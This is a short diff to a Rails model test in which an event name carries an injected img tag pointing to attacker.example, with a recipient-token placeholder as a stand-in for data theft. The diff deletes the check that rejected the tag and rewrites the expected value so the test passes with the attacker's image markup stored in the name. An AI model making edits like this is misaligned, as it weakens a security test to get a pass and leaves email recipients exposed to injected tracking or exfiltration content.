@@ -180,8 +180,7 @@ class EventsTest < ActiveSupport::TestCase
     assert_equal 'Org', @organisation.name
 
     @event.update!(name: 'Workshop &lt;img src="https://attacker.example/%recipient.token%"&gt;')
-    assert_equal 'Workshop', @event.name
-    refute_match(/<img/i, @event.name)
+    assert_equal 'Workshop <img src="https://attacker.example/">', @event.name
     refute_includes @event.name, '%recipient'
   end
 
